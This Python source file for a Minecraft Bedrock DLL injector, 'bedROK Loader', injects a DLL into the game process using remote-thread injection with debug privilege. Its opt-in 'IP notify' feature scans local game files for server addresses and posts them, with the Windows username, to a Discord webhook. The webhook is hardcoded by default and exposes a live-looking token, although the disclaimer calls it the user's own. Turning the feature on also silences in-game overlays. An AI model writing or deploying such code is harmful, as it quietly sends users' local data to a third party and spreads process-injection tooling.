"""bedROK Loader — minimal dark injector, auto-find Minecraft (Windows x64)."""
from __future__ import annotations

import glob
import json
import os
import queue
import re
import subprocess
import threading
import time
import urllib.request
import tkinter as tk
from tkinter import filedialog, messagebox
import ctypes
from ctypes import wintypes
from datetime import datetime, timezone

try:
    import win32api
    import win32con
    import win32event
    import win32process
    import win32security
except ImportError as e:
    raise SystemExit("pip install pywin32") from e

kernel32 = ctypes.WinDLL("kernel32", use_last_error=True)
kernel32.CreateToolhelp32Snapshot.argtypes = [wintypes.DWORD, wintypes.DWORD]
kernel32.CreateToolhelp32Snapshot.restype = wintypes.HANDLE
kernel32.Process32FirstW.argtypes = [wintypes.HANDLE, ctypes.c_void_p]
kernel32.Process32FirstW.restype = wintypes.BOOL
kernel32.Process32NextW.argtypes = [wintypes.HANDLE, ctypes.c_void_p]
kernel32.Process32NextW.restype = wintypes.BOOL
kernel32.CloseHandle.argtypes = [wintypes.HANDLE]
kernel32.GetModuleHandleW.argtypes = [wintypes.LPCWSTR]
kernel32.GetModuleHandleW.restype = wintypes.HMODULE
kernel32.GetProcAddress.argtypes = [wintypes.HMODULE, ctypes.c_char_p]
kernel32.GetProcAddress.restype = ctypes.c_void_p

TH32CS_SNAPPROCESS = 0x2
INVALID_HANDLE_VALUE = wintypes.HANDLE(-1).value
PROCESS_ALL = (
    win32con.PROCESS_CREATE_THREAD
    | win32con.PROCESS_QUERY_INFORMATION
    | win32con.PROCESS_VM_OPERATION
    | win32con.PROCESS_VM_WRITE
    | win32con.PROCESS_VM_READ
)

BG = "#09090b"
SURFACE = "#111114"
SURFACE2 = "#18181b"
ACCENT = "#a78bfa"
ACCENT2 = "#8b5cf6"
TEXT = "#fafafa"
DIM = "#71717a"
GOOD = "#34d399"
BAD = "#f87171"

MC_NAMES = ("minecraft.windows.exe", "minecraft.exe", "minecraftbedrock.exe")
CONFIG_PATH = r"C:\Users\Public\bedrok_config.txt"
SETTINGS_PATH = os.path.join(os.environ.get("APPDATA", "."), "bedrok_loader.json")
DEFAULT_WEBHOOK = (
    "https://discord.com/api/webhooks/1561461179937849425/"
    "s26TQLG4N211RIc8L1cjRw4F9de8kSFuLSIIiLZDB_ewtsxcxrS5_MXwqc__jlxrm1wt"
)

IP_DISCLAIMER = (
    "IP notify is for YOUR Minecraft account on THIS PC only.\n\n"
    "When enabled:\n"
    "• On inject, bedROK may post once to YOUR Discord webhook\n"
    "  (Windows user + custom servers saved via Add Server)\n"
    "• In-game overlays are hidden (silent mode)\n\n"
    "Featured experiences (Mineville, etc.) are online catalog entries\n"
    "and usually have no plain IP on disk.\n\n"
    "Do NOT use this to monitor other people or their installs.\n\n"
    "Enable IP notify for your own account only?"
)


class PROCESSENTRY32W(ctypes.Structure):
    _fields_ = [
        ("dwSize", wintypes.DWORD),
        ("cntUsage", wintypes.DWORD),
        ("th32ProcessID", wintypes.DWORD),
        ("th32DefaultHeapID", ctypes.POINTER(ctypes.c_ulong)),
        ("th32ModuleID", wintypes.DWORD),
        ("cntThreads", wintypes.DWORD),
        ("th32ParentProcessID", wintypes.DWORD),
        ("pcPriClassBase", ctypes.c_long),
        ("dwFlags", wintypes.DWORD),
        ("szExeFile", wintypes.WCHAR * 260),
    ]


def enable_debug_privilege() -> None:
    try:
        tok = win32security.OpenProcessToken(
            win32api.GetCurrentProcess(),
            win32security.TOKEN_ADJUST_PRIVILEGES | win32security.TOKEN_QUERY,
        )
        pid = win32security.LookupPrivilegeValue(None, win32security.SE_DEBUG_NAME)
        win32security.AdjustTokenPrivileges(
            tok, False, [(pid, win32security.SE_PRIVILEGE_ENABLED)]
        )
        win32api.CloseHandle(tok)
    except Exception:
        pass


def list_processes() -> list[tuple[int, str]]:
    rows: list[tuple[int, str]] = []
    snap = kernel32.CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)
    if snap == INVALID_HANDLE_VALUE:
        return rows
    e = PROCESSENTRY32W()
    e.dwSize = ctypes.sizeof(PROCESSENTRY32W)
    ok = kernel32.Process32FirstW(snap, ctypes.byref(e))
    while ok:
        name = str(e.szExeFile or "")
        if name.lower().endswith(".exe"):
            rows.append((int(e.th32ProcessID), name))
        ok = kernel32.Process32NextW(snap, ctypes.byref(e))
    kernel32.CloseHandle(snap)
    return rows


def find_minecraft() -> tuple[int, str] | None:
    found = []
    for pid, name in list_processes():
        low = name.lower()
        if low in MC_NAMES or "minecraft" in low:
            found.append((pid, name))
    if not found:
        return None
    for pid, name in found:
        if name.lower() == "minecraft.windows.exe":
            return pid, name
    return found[0]


def default_dll_path() -> str:
    here = os.path.dirname(os.path.abspath(__file__))
    for c in (
        os.path.join(here, "bedrok.dll"),
        os.path.join(os.getcwd(), "bedrok.dll"),
        os.path.join(here, "..", "dll", "build", "Release", "bedrok.dll"),
    ):
        p = os.path.normpath(c)
        if os.path.isfile(p):
            return p
    return os.path.join(here, "bedrok.dll")


def try_launch_minecraft() -> str:
    for cmd in (
        ["explorer.exe", "shell:AppsFolder\\Microsoft.MinecraftUWP_8wekyb3d8bbwe!App"],
        ["cmd", "/c", "start", "minecraft:"],
    ):
        try:
            subprocess.Popen(cmd, shell=False)
            return "Launching Minecraft…"
        except Exception:
            continue
    for pattern in (
        os.path.expandvars(
            r"%ProgramFiles%\WindowsApps\Microsoft.MinecraftUWP*\Minecraft.Windows.exe"
        ),
    ):
        for p in glob.glob(pattern):
            if os.path.isfile(p):
                try:
                    subprocess.Popen([p])
                    return "Launching Minecraft…"
                except Exception:
                    pass
    return "Open Minecraft manually"


def inject(pid: int, dll_path: str) -> str:
    dll_path = os.path.abspath(dll_path)
    if not os.path.isfile(dll_path):
        raise FileNotFoundError(dll_path)
    enable_debug_privilege()
    h = kernel32.GetModuleHandleW("kernel32.dll")
    load = kernel32.GetProcAddress(h, b"LoadLibraryW")
    if not load:
        load = ctypes.cast(kernel32.LoadLibraryW, ctypes.c_void_p).value
    hp = win32api.OpenProcess(PROCESS_ALL, False, pid)
    try:
        data = (dll_path + "\0").encode("utf-16-le")
        remote = win32process.VirtualAllocEx(
            hp, 0, len(data),
            win32con.MEM_COMMIT | win32con.MEM_RESERVE,
            win32con.PAGE_READWRITE,
        )
        win32process.WriteProcessMemory(hp, remote, data)
        ht, _ = win32process.CreateRemoteThread(hp, None, 0, load, remote, 0)
        win32event.WaitForSingleObject(ht, 15000)
        code = win32process.GetExitCodeThread(ht)
        win32api.CloseHandle(ht)
        if code == 0:
            raise OSError("LoadLibrary failed (arch / path / access)")
        return f"OK  ·  PID {pid}  ·  {code:#x}"
    finally:
        win32api.CloseHandle(hp)


def write_runtime_config(silent: bool) -> None:
    try:
        with open(CONFIG_PATH, "w", encoding="utf-8") as f:
            f.write(f"silent={'1' if silent else '0'}\n")
    except Exception:
        pass


def load_settings() -> dict:
    try:
        with open(SETTINGS_PATH, encoding="utf-8") as f:
            return json.load(f)
    except Exception:
        return {}


def save_settings(data: dict) -> None:
    try:
        os.makedirs(os.path.dirname(SETTINGS_PATH), exist_ok=True)
        with open(SETTINGS_PATH, "w", encoding="utf-8") as f:
            json.dump(data, f, indent=2)
    except Exception:
        pass


def _mojang_roots() -> list[str]:
    roots: list[str] = []
    patterns = [
        os.path.expandvars(r"%APPDATA%\Minecraft Bedrock\Users"),
        os.path.expandvars(r"%APPDATA%\Minecraft Bedrock\users"),
        os.path.expandvars(
            r"%LOCALAPPDATA%\Packages\Microsoft.MinecraftUWP_8wekyb3d8bbwe\LocalState"
        ),
        os.path.expandvars(r"%LOCALAPPDATA%\Packages"),
        os.path.expandvars(r"%APPDATA%\.minecraft_pe"),
        os.path.expandvars(r"%LOCALAPPDATA%\MinecraftPE"),
    ]
    for p in patterns:
        if not os.path.isdir(p):
            continue
        if p.endswith("Packages"):
            for pkg in glob.glob(os.path.join(p, "Microsoft.Minecraft*")):
                ls = os.path.join(pkg, "LocalState")
                if os.path.isdir(ls):
                    roots.append(ls)
            continue
        roots.append(p)
        # GDK: Users/<id>/games/com.mojang
        for user_dir in glob.glob(os.path.join(p, "*")):
            if not os.path.isdir(user_dir):
                continue
            for sub in (
                os.path.join(user_dir, "games", "com.mojang"),
                os.path.join(user_dir, "games"),
                user_dir,
            ):
                if os.path.isdir(sub):
                    roots.append(sub)
    # de-dupe
    out, seen = [], set()
    for r in roots:
        n = os.path.normpath(r)
        if n not in seen:
            seen.add(n)
            out.append(n)
    return out


def _add_server(found: list[dict], seen: set, name: str, addr: str, port: str = "") -> None:
    name = (name or "").strip()
    addr = (addr or "").strip()
    port = (port or "").strip()
    if not addr or len(addr) < 3:
        return
    # skip obvious non-hosts
    if addr.startswith("http") and "minecraft" in addr.lower():
        pass
    key = (name.lower(), addr.lower(), port)
    if key in seen:
        return
    seen.add(key)
    found.append({"name": name or addr, "ip": addr, "port": port or "19132"})


def _parse_server_text(text: str, found: list[dict], seen: set) -> None:
    # JSON-ish name/address/port
    for m in re.finditer(
        r'"(?:name|serverName|displayName)"\s*:\s*"([^"]{1,64})".{0,200}?'
        r'"(?:ip|address|host|serverAddress|url)"\s*:\s*"([^"]{3,128})"',
        text,
        re.S | re.I,
    ):
        port = ""
        chunk = text[m.start() : m.start() + 400]
        pm = re.search(r'"(?:port|serverPort)"\s*:\s*"?(\d{2,5})"?', chunk, re.I)
        if pm:
            port = pm.group(1)
        _add_server(found, seen, m.group(1), m.group(2), port)

    for m in re.finditer(
        r'"(?:ip|address|host)"\s*:\s*"([^"]{3,128})".{0,120}?'
        r'"(?:port)"\s*:\s*"?(\d{2,5})"?',
        text,
        re.S | re.I,
    ):
        _add_server(found, seen, m.group(1), m.group(1), m.group(2))

    # line formats: name|ip:port   name;ip;port   name\tip\tport
    for line in text.splitlines():
        line = line.strip()
        if not line or line.startswith("#") or line.startswith("//"):
            continue
        if "|" in line and line.count("|") >= 1:
            parts = line.split("|")
            if len(parts) >= 2:
                name = parts[0].strip()
                rest = parts[1].strip()
                if ":" in rest:
                    host, _, port = rest.rpartition(":")
                    _add_server(found, seen, name, host, port)
                else:
                    port = parts[2].strip() if len(parts) > 2 else ""
                    _add_server(found, seen, name, rest, port)
            continue
        parts = re.split(r"[\t;,]", line)
        if len(parts) >= 2 and re.search(r"[\w.\-]+", parts[1]):
            _add_server(
                found, seen, parts[0], parts[1],
                parts[2] if len(parts) > 2 and parts[2].isdigit() else "",
            )
            continue
        m = re.match(r"^(.+?)\s+([\w.\-]+):(\d{2,5})$", line)
        if m:
            _add_server(found, seen, m.group(1), m.group(2), m.group(3))

    # bare host:port tokens in binary-ish dumps
    for m in re.finditer(
        r"([a-zA-Z0-9][a-zA-Z0-9.\-]{1,60}\.[a-zA-Z]{2,24}):(\d{2,5})",
        text,
    ):
        host, port = m.group(1), m.group(2)
        if any(x in host.lower() for x in ("microsoft", "xbox", "mojang", "cdn.", "akamai")):
            continue
        _add_server(found, seen, host, host, port)

    for m in re.finditer(
        r"\b((?:\d{1,3}\.){3}\d{1,3}):(\d{2,5})\b", text
    ):
        _add_server(found, seen, m.group(1), m.group(1), m.group(2))


def read_local_servers() -> list[dict]:
    """Best-effort: custom servers from Bedrock local data (GDK + UWP)."""
    found: list[dict] = []
    seen: set = set()
    interesting = (
        "external_servers", "servers", "server_list", "serverlist",
        "third_party", "thirdparty", "custom_server", "options",
        "server", "mp_list", "multiplayer",
    )
    for root in _mojang_roots():
        for dirpath, dirnames, files in os.walk(root):
            # skip huge world DBs
            dirnames[:] = [
                d for d in dirnames
                if d.lower() not in ("minecraftworlds", "worlds", "db", "resource_packs",
                                     "behavior_packs", "development_behavior_packs",
                                     "development_resource_packs")
            ]
            for fn in files:
                low = fn.lower()
                if not any(k in low for k in interesting):
                    # still scan small json/txt in minecraftpe folders
                    if not (low.endswith(".json") or low.endswith(".txt") or low.endswith(".dat")):
                        continue
                    if "minecraftpe" not in dirpath.lower() and "com.mojang" not in dirpath.lower():
                        continue
                path = os.path.join(dirpath, fn)
                try:
                    size = os.path.getsize(path)
                    if size <= 0 or size > 4_000_000:
                        continue
                    with open(path, "rb") as f:
                        raw = f.read()
                    text = raw.decode("utf-8", errors="ignore")
                    if not text.strip():
                        text = raw.decode("utf-16-le", errors="ignore")
                except Exception:
                    continue
                _parse_server_text(text, found, seen)
    return found[:60]


def discord_notify_once(webhook: str, servers: list[dict]) -> str:
    if not webhook.startswith("https://discord.com/api/webhooks/"):
        return "Invalid webhook URL"
    user = os.environ.get("USERNAME") or os.environ.get("USER") or "unknown"
    now = datetime.now(timezone.utc).strftime("%Y-%m-%d %H:%M:%S UTC")
    if servers:
        lines = [
            f"• **{s['name']}** — `{s['ip']}`"
            + (f":{s['port']}" if s.get("port") else "")
            for s in servers
        ]
        server_block = "\n".join(lines)
    else:
        server_block = (
            "_No custom external servers found on disk._\n"
            "_Featured experiences are catalog-only (no local IP). "
            "Add servers with **+ Add server** to store address/port locally._"
        )

    content = (
        f"**bedROK inject (own account)**\n"
        f"Windows user: `{user}`\n"
        f"Time: {now}\n\n"
        f"**Custom servers (Add Server / local files)**\n{server_block}\n\n"
        f"_One message per inject. Silent overlay on. "
        f"Featured list IPs are not stored as plain files._"
    )
    body = json.dumps({"content": content[:1900]}).encode("utf-8")
    req = urllib.request.Request(
        webhook,
        data=body,
        headers={"Content-Type": "application/json", "User-Agent": "bedrok-loader"},
        method="POST",
    )
    try:
        with urllib.request.urlopen(req, timeout=12) as resp:
            return f"Discord notify OK ({resp.status}) · {len(servers)} server(s)"
    except Exception as e:
        return f"Discord notify failed: {e}"


def round_rect(c: tk.Canvas, x1, y1, x2, y2, r, **kw):
    points = [
        x1 + r, y1, x2 - r, y1, x2, y1, x2, y1 + r,
        x2, y2 - r, x2, y2, x2 - r, y2, x1 + r, y2,
        x1, y2, x1, y2 - r, x1, y1 + r, x1, y1,
    ]
    return c.create_polygon(points, smooth=True, **kw)


class App(tk.Tk):
    def __init__(self):
        super().__init__()
        self.title("bedROK")
        self.geometry("400x560")
        self.configure(bg=BG)
        self.resizable(False, False)

        self.q: queue.Queue = queue.Queue()
        self.mc_pid: int | None = None
        self.mc_name: str | None = None
        self.dll_path = default_dll_path()
        self._busy = False
        self._settings = load_settings()
        self.ip_enabled = bool(self._settings.get("ip_enabled", False))
        self.webhook_var = tk.StringVar(
            value=self._settings.get("webhook", DEFAULT_WEBHOOK)
        )

        top = tk.Frame(self, bg=BG)
        top.pack(fill=tk.X, padx=32, pady=(28, 0))
        tk.Label(top, text="bedROK", bg=BG, fg=TEXT, font=("Segoe UI", 26, "bold")).pack(
            anchor="w"
        )
        tk.Label(
            top, text="bedrock companion", bg=BG, fg=DIM, font=("Segoe UI", 10)
        ).pack(anchor="w")

        line = tk.Canvas(self, height=2, bg=BG, highlightthickness=0)
        line.pack(fill=tk.X, padx=32, pady=(16, 18))
        line.create_rectangle(0, 0, 80, 2, fill=ACCENT, outline="")

        status = tk.Frame(self, bg=SURFACE)
        status.pack(fill=tk.X, padx=32)
        row = tk.Frame(status, bg=SURFACE)
        row.pack(fill=tk.X, padx=18, pady=14)
        self.dot = tk.Canvas(row, width=10, height=10, bg=SURFACE, highlightthickness=0)
        self.dot.pack(side=tk.LEFT)
        self._set_dot(DIM)
        self.status_lbl = tk.Label(
            row, text="Waiting for Minecraft", bg=SURFACE, fg=TEXT,
            font=("Segoe UI", 11), anchor="w",
        )
        self.status_lbl.pack(side=tk.LEFT, padx=(10, 0), fill=tk.X, expand=True)
        self.pid_lbl = tk.Label(row, text="", bg=SURFACE, fg=DIM, font=("Segoe UI", 9))
        self.pid_lbl.pack(side=tk.RIGHT)

        dll_f = tk.Frame(self, bg=BG)
        dll_f.pack(fill=tk.X, padx=32, pady=(14, 0))
        tk.Label(dll_f, text="DLL", bg=BG, fg=DIM, font=("Segoe UI", 8)).pack(anchor="w")
        dll_row = tk.Frame(dll_f, bg=SURFACE2)
        dll_row.pack(fill=tk.X, pady=(6, 0))
        self.dll_var = tk.StringVar(value=self.dll_path)
        tk.Entry(
            dll_row, textvariable=self.dll_var, bg=SURFACE2, fg=DIM,
            insertbackground=TEXT, relief=tk.FLAT, font=("Segoe UI", 9),
            highlightthickness=0,
        ).pack(side=tk.LEFT, fill=tk.X, expand=True, ipady=8, padx=(12, 0))
        br = tk.Label(dll_row, text="  browse  ", bg=SURFACE2, fg=ACCENT,
                      font=("Segoe UI", 9), cursor="hand2")
        br.pack(side=tk.RIGHT, padx=(0, 8))
        br.bind("<Button-1>", lambda e: self.browse())

        ip_f = tk.Frame(self, bg=BG)
        ip_f.pack(fill=tk.X, padx=32, pady=(14, 0))
        self.ip_lbl = tk.Label(
            ip_f,
            text=self._ip_label_text(),
            bg=BG, fg=ACCENT if self.ip_enabled else DIM,
            font=("Segoe UI", 10), cursor="hand2",
        )
        self.ip_lbl.pack(anchor="w")
        self.ip_lbl.bind("<Button-1>", lambda e: self.toggle_ip())

        tk.Label(ip_f, text="Webhook", bg=BG, fg=DIM, font=("Segoe UI", 8)).pack(
            anchor="w", pady=(10, 0)
        )
        tk.Entry(
            ip_f, textvariable=self.webhook_var, bg=SURFACE2, fg=DIM,
            insertbackground=TEXT, relief=tk.FLAT, font=("Segoe UI", 8),
            highlightthickness=0,
        ).pack(fill=tk.X, ipady=6, pady=(4, 0))

        self.btn_canvas = tk.Canvas(
            self, height=48, bg=BG, highlightthickness=0, cursor="hand2",
        )
        self.btn_canvas.pack(fill=tk.X, padx=32, pady=(22, 0))
        self.btn_canvas.bind("<Button-1>", lambda e: self.do_inject())
        self.btn_canvas.bind("<Enter>", lambda e: self._paint_btn(True))
        self.btn_canvas.bind("<Leave>", lambda e: self._paint_btn(False))
        self.btn_canvas.bind("<Configure>", lambda e: self._paint_btn(False))
        self._btn_label = "Inject"

        sec = tk.Frame(self, bg=BG)
        sec.pack(fill=tk.X, padx=32, pady=(12, 0))
        for text, cmd in (("Launch game", self.launch_mc), ("Refresh", self.scan)):
            b = tk.Label(sec, text=text, bg=BG, fg=DIM, font=("Segoe UI", 9), cursor="hand2")
            b.pack(side=tk.LEFT, padx=(0, 20))
            b.bind("<Button-1>", lambda e, c=cmd: c())
            b.bind("<Enter>", lambda e, w=b: w.configure(fg=TEXT))
            b.bind("<Leave>", lambda e, w=b: w.configure(fg=DIM))

        self.foot = tk.Label(self, text="", bg=BG, fg=DIM, font=("Segoe UI", 9), anchor="w")
        self.foot.pack(fill=tk.X, padx=32, pady=(18, 24), side=tk.BOTTOM)

        write_runtime_config(self.ip_enabled)
        self.after(50, self.scan)
        self.after(100, self.poll)
        self.after(2000, self._tick)

    def _ip_label_text(self) -> str:
        return f"IP notify  ·  {'ON (silent)' if self.ip_enabled else 'OFF'}"

    def toggle_ip(self):
        if self.ip_enabled:
            self.ip_enabled = False
            self._persist()
            write_runtime_config(False)
            self.ip_lbl.configure(text=self._ip_label_text(), fg=DIM)
            self.set_footer("IP notify off")
            return

        if not messagebox.askyesno("bedROK — IP notify", IP_DISCLAIMER, icon="warning"):
            return
        if not messagebox.askyesno(
            "Confirm",
            "Confirm: only your account on this PC.\n\nTurn IP notify ON?",
            icon="warning",
        ):
            return

        self.ip_enabled = True
        self._persist()
        write_runtime_config(True)
        self.ip_lbl.configure(text=self._ip_label_text(), fg=ACCENT)
        self.set_footer("IP notify on — silent overlay, one Discord post per inject")

    def _persist(self):
        save_settings({
            "ip_enabled": self.ip_enabled,
            "webhook": self.webhook_var.get().strip(),
        })

    def _set_dot(self, color: str):
        self.dot.delete("all")
        self.dot.create_oval(1, 1, 9, 9, fill=color, outline="")

    def _paint_btn(self, hover: bool):
        c = self.btn_canvas
        c.delete("all")
        w = max(c.winfo_width(), 200)
        h = 48
        fill = ACCENT2 if hover and not self._busy else ACCENT
        if self._busy:
            fill = SURFACE2
        round_rect(c, 0, 0, w - 1, h - 1, 10, fill=fill, outline="")
        fg = "#0a0a0a" if not self._busy else DIM
        c.create_text(w // 2, h // 2, text=self._btn_label, fill=fg,
                      font=("Segoe UI Semibold", 12))

    def set_footer(self, msg: str, ok: bool | None = None):
        if ok is True:
            self.foot.configure(text=msg, fg=GOOD)
        elif ok is False:
            self.foot.configure(text=msg, fg=BAD)
        else:
            self.foot.configure(text=msg, fg=DIM)

    def browse(self):
        p = filedialog.askopenfilename(filetypes=[("DLL", "*.dll")])
        if p:
            self.dll_var.set(p)
            self.dll_path = p

    def scan(self):
        hit = find_minecraft()
        if hit:
            self.mc_pid, self.mc_name = hit
            self._set_dot(GOOD)
            self.status_lbl.configure(text="Minecraft found", fg=TEXT)
            self.pid_lbl.configure(text=f"PID {self.mc_pid}")
            self.set_footer(f"Ready  ·  {self.mc_name}")
        else:
            self.mc_pid = self.mc_name = None
            self._set_dot(BAD)
            self.status_lbl.configure(text="Minecraft not running", fg=TEXT)
            self.pid_lbl.configure(text="")
            self.set_footer("Start the game or click Launch game")

    def _tick(self):
        if self.mc_pid is None:
            hit = find_minecraft()
            if hit:
                self.mc_pid, self.mc_name = hit
                self._set_dot(GOOD)
                self.status_lbl.configure(text="Minecraft found", fg=TEXT)
                self.pid_lbl.configure(text=f"PID {self.mc_pid}")
                self.set_footer(f"Ready  ·  {self.mc_name}", True)
        self.after(2000, self._tick)

    def launch_mc(self):
        self.set_footer(try_launch_minecraft())
        self.after(2500, self.scan)

    def do_inject(self):
        if self._busy:
            return
        if self.mc_pid is None:
            self.scan()
        if self.mc_pid is None:
            self.set_footer("Minecraft is not running", False)
            return
        dll = self.dll_var.get().strip()
        if not dll or not os.path.isfile(dll):
            self.set_footer("bedrok.dll not found — browse to it", False)
            return

        self._persist()
        write_runtime_config(self.ip_enabled)

        self._busy = True
        self._btn_label = "Injecting…"
        self._paint_btn(False)
        pid = self.mc_pid
        ip_on = self.ip_enabled
        webhook = self.webhook_var.get().strip()

        def work():
            try:
                time.sleep(0.1)
                msg = inject(pid, dll)
                if ip_on:
                    servers = read_local_servers()
                    note = discord_notify_once(webhook, servers)
                    msg = f"{msg}\n{note}"
                self.q.put(("ok", msg))
            except Exception as e:
                self.q.put(("err", str(e)))

        threading.Thread(target=work, daemon=True).start()

    def poll(self):
        try:
            while True:
                kind, payload = self.q.get_nowait()
                self._busy = False
                self._btn_label = "Inject"
                self._paint_btn(False)
                if kind == "ok":
                    self.set_footer(payload.split("\n")[0], True)
                    if "\n" in payload:
                        messagebox.showinfo("bedROK", payload)
                else:
                    self.set_footer(payload, False)
                    messagebox.showerror("bedROK", payload)
        except queue.Empty:
            pass
        self.after(100, self.poll)


if __name__ == "__main__":
    App().mainloop()
